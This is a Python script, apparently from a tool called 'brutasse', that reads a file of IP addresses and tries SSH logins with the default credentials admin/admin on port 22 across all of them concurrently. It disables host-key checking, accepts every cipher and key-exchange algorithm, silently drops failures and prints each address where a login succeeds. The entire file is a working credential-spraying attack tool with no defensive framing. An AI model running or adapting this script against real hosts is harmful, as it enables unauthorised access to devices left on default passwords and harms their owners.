#!/usr/bin/env python3

import argparse
import asyncio

import asyncssh
from termcolor import colored

from brutasse.parallel import progressbar_execute
from brutasse.utils import ConnectionFailed, ips_from_file


async def ssh_brute(ip: str, port: int, username: str, password: str):
    common_opts = {
        "known_hosts": None,
        "preferred_auth": ["keyboard-interactive", "password"],
        "kex_algs": "*",
        "encryption_algs": "*",
        "mac_algs": "*",
    }
    brute_opts = {
        "host": ip,
        "port": port,
        "username": username,
        "password": password,
        "connect_timeout": 2,
        "login_timeout": 10,
    }
    async with asyncssh.connect(**(common_opts | brute_opts)):
        return f"{ip}"


async def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("infile", type=argparse.FileType("r"))
    args = parser.parse_args()
    coros = [ssh_brute(ip, 22, "admin", "admin") for ip in ips_from_file(args.infile)]
    async for fut in progressbar_execute(coros, 100):
        try:
            res = fut.result()
            print(res)
        except ConnectionFailed:
            pass
        except ConnectionResetError:
            pass
        except asyncssh.PermissionDenied:
            pass
        except asyncssh.ConnectionLost:
            pass
        except TimeoutError:
            pass
        except Exception as e:
            print(colored(repr(e), "red"))


if __name__ == "__main__":
    asyncio.run(main())
